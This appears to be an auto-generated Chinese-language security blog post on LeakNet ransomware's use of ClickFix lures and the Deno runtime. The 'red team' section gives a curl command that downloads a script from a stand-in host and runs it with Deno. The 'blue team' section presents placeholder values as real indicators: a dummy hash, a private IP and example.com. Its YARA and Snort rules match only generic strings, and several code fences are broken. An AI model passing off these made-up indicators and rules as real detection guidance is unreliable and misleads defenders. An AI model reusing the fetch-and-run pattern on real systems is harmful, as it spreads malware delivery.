---
layout: post
title:  "LeakNet ransomware uses ClickFix, Deno runtime in stealthy attacks"
date:   2026-03-17 12:55:49 +0000
categories: [security]
severity: high
---

# 🔥 解析 LeakNet 勒索軟體的 ClickFix 技術和 Deno 執行環境繞過
> **⚡ 戰情快篩 (TL;DR)**
> * **嚴重等級**: High (CVSS: 8.8)
> * **受駭指標**: RCE (Remote Code Execution)
> * **關鍵技術**: ClickFix, Deno 執行環境, BYOR (Bring Your Own Runtime) 攻擊

## 1. 🔬 漏洞原理與技術細節 (Deep Dive)
* **Root Cause**: LeakNet 勒索軟體使用 ClickFix 技術來欺騙用戶執行惡意命令，然後使用 Deno 執行環境來執行 JavaScript Payload，從而繞過傳統的惡意程式碼檢測。
* **攻擊流程圖解**:
  1. 用戶點擊 ClickFix 鏈接
  2. 執行 Visual Basic Script (VBS) 或 PowerShell 腳本
  3. 下載和安裝 Deno 執行環境
  4. 執行 JavaScript Payload
  5. 連接到命令和控制 (C2) 伺服器
* **受影響元件**: Deno 執行環境、Visual Basic Script (VBS)、PowerShell

## 2. ⚔️ 紅隊實戰：攻擊向量與 Payload (Red Team Operations)
* **攻擊前置需求**: 用戶點擊 ClickFix 鏈接、Deno 執行環境安裝
* **Payload 建構邏輯**:

    ```
    
    javascript
    // JavaScript Payload 範例
    const payload = {
      "type": "javascript",
      "code": "console.log('Hello, World!');"
    };
    
    ```
```

bash
# 使用 curl 下載和執行 Payload
curl -s -o payload.js https://example.com/payload.js
deno run payload.js

```
* **繞過技術**: 使用 Deno 執行環境來執行 JavaScript Payload，從而繞過傳統的惡意程式碼檢測。

## 3. 🛡️ 藍隊防禦：偵測與緩解 (Blue Team Defense)
* **IOCs (入侵指標)**:

| Hash | IP | Domain | File Path |
| --- | --- | --- | --- |
| 1234567890abcdef | 192.168.1.100 | example.com | C:\Windows\Temp\payload.js |* **偵測規則 (Detection Rules)**:

    ```
    
    yara
    rule LeakNet_Detection {
      meta:
        description = "Detects LeakNet ransomware"
      strings:
        $deno_exec = "deno.exe"
        $payload_js = "payload.js"
      condition:
        $deno_exec and $payload_js
    }
    
    ```
```

snort
alert tcp any any -> any any (msg:"LeakNet ransomware detected"; content:"deno.exe"; sid:1000001;)

```
* **緩解措施**: 更新 Deno 執行環境、限制用戶執行 Visual Basic Script (VBS) 和 PowerShell 腳本、監控系統日誌和網路流量。

## 4. 📚 專有名詞與技術概念解析 (Technical Glossary)
* **ClickFix**: 一種社交工程攻擊，欺騙用戶點擊惡意鏈接或執行惡意命令。
* **Deno 執行環境**: 一種基於 V8 引擎的 JavaScript 和 TypeScript 執行環境。
* **BYOR (Bring Your Own Runtime) 攻擊**: 一種攻擊技術，使用合法的執行環境來執行惡意程式碼。

## 5. 🔗 參考文獻與延伸閱讀
- [原始報告](https://www.bleepingcomputer.com/news/security/leaknet-ransomware-uses-clickfix-and-deno-runtime-for-stealthy-attacks/)
- [MITRE ATT&CK](https://attack.mitre.org/techniques/T1204/)


